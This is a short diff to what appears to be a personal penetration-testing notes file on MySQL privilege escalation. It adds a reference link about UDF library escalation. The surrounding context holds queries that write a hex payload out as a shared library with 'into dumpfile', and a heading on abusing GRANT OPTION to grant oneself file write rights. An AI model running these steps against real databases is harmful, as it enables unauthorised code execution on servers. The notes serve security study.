@@ -15,6 +15,7 @@ prepare payload as plain hex with no newlines with ~/kb/bash-scripting/string-to
 select @@plugin_dir;
 select binary @shell into dumpfile '/path/to/file/file.so';
 ```
+additional UDF exploit info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library
 
 ## exploit GRANT OPTION to grant file write permissions to self
 must have `GRANT OPTION` permission
